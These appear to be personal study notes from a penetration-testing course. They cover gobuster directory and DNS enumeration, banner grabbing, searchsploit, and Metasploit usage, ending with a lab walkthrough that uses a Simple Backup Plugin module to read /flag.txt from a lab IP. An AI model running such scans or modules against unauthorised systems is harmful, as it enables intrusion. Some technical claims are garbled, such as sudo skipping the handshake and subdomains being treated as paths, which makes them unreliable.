# WEB ENUMERATION


**Gobuster tool**
GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. 


**1. Directory Enumeration:**
directory brute forcing: dir brute forcing is specified by the ``dir`` flag
```
gobuster dir -u ip_address -w wordlists
```
Gobuster Status Codes:
| status code | Description | 
| --- | --- |
| 200 | web resource's request was successful |
|  403  | forbidenn to access the web resource |
| 301 | indicates that we are being redirected(not failure) |


```
gobuster dir -u http://83.136.251.68:33315 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**2. DNS SubDomain Enumeration**
In subdomains E.g domain: zetech.ac.ke get subdomain: zetech.ac.ke/admin 
subdomains are used to host resources(important|relevant)  such as admin panels or applications with additional functionality that could be exploited. 
Gobuster provides the ``dns`` option followed by the ``-d`` flag for enumerating/testing subdomains
**when using dns enumeration use: ``domain_name.com`` or ``ip_address`` specifically**

```
gobuster dns -d  ip_address/web_url  -w wordlist
```

**Banner Grabbing/Web Server Headers**  
banner grabbing is detecting the specific service on a server/web service. This can help in identifying vulnerabilties for a specific server/service. One can use
client URL : culr ```curl -IL web_address```

EyeWitness, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

**Whatweb**
whatweb is used to extract the version of web servers, supporting frameworks and applications.


### **TASKS**
perform web enumeration for the following: 83.136.251.68:33315



# public exploits
after finding services or applications running on a target machine or server, we proceed to check if they have any vulnerability

Tools Used in checking vulnerability:  
- searchsploit:
(already installed in kali) which we can use to search for public vulnerabilities/exploits for any application.
We can install it with the following command: ``sudo apt install exploitdb -y``
**Use:**    
``searchsploit openssh 7.2`` : ``searchsploit(command) service_version``

- [Rapid7](https://www.rapid7.com/db/)
- [ExploitDB](https://www.exploit-db.com/)
- [Vulnerability_Vub](https://www.vulnerability-lab.com/)


**Metasploit Primer**
The Metasploit Framework (MSF) contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:
Running reconnaissance scripts to enumerate remote hosts and compromised targets
Verification scripts to test the existence of a vulnerability without actually compromising the target
Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
Many post-exploitation and pivoting tools


to run metasploit framework use:
```msfconsole``
To search for a specific exploit we use: ``search exploit exploitName`` E.g ``search exploit EternalBlue``

After getting the information on the service vulnerablity use the following:
``use given exploit`` to view information use :``info index_number_exploit``
View what is required to run the exploit : ``required === YES`` make sure you set this.
``check``: command is used to check if the target is vulnerable . note : not all exploits have check for avialability
``run`` || ``exploit`` to initiate the attack(exploit) on the given vulnerability
meterpreter: is used to launch a interactive shell with the target(remote|phsical) machine



## **SOLVED PUBLIC EXPLOITS**
run nmap to recon:
```
sudo nmap -sC -sV  ip_address
```
always use sudo to skip handshake 3 way

```
# go to website
# check vulnerability for the given application : Simple Backup Plugin 2.7.10
# run
msfconsole

# check vulnerability
> search Simple Backup Plugin 2.7.10
> use vulnerability_index_number
> show options

# set rhost and rport to your target machine
# set FILEPATH to /flag.txt
set FILEPATH /flag.txt
run
# cd to diretory : file saved
cat fileName
